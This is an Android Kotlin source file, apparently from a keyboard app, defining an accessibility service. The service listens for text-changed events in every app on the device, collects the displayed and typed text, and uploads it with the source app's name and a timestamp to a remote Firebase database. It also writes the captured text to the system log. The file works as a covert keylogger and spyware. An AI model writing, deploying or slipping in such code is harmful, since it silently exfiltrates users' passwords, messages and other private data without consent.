package com.example.mykeyboard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class AppAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "AppAccessibilityService"
        private val scope = CoroutineScope(Dispatchers.IO)
        private fun getDatabaseRef() = try {
            FirebaseDatabase.getInstance().getReference("accessibility_text_batches")
        } catch (e: Exception) {
            null
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            val info = AccessibilityServiceInfo().apply {
                eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or AccessibilityEvent.TYPE_VIEW_FOCUSED
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
                notificationTimeout = 1000
            }
            serviceInfo = info
        } catch (e: Exception) {
            Log.e(TAG, "Error in onServiceConnected", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            val textList = event.text

            if (textList.isNullOrEmpty()) return
            val typedText = textList.joinToString(" ")

            if (typedText.isBlank()) return

            scope.launch {
                try {
                    val ref = getDatabaseRef() ?: return@launch
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9._-]"), "_")

                    val eventData = mapOf(
                        "packageName" to sanitizedAppName,
                        "text" to typedText,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child(sanitizedAppName).child(timestampKey).setValue(eventData)
                        .addOnSuccessListener {
                            Log.d(TAG, "Accessibility text captured: $typedText ($sanitizedAppName)")
                        }
                        .addOnFailureListener { e: Exception ->
                            Log.e(TAG, "Failed to log accessibility text", e)
                        }
                } catch (e: Exception) {
                    Log.e(TAG, "Error in coroutine accessibility event", e)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onAccessibilityEvent", e)
        }
    }

    override fun onInterrupt() {}
}
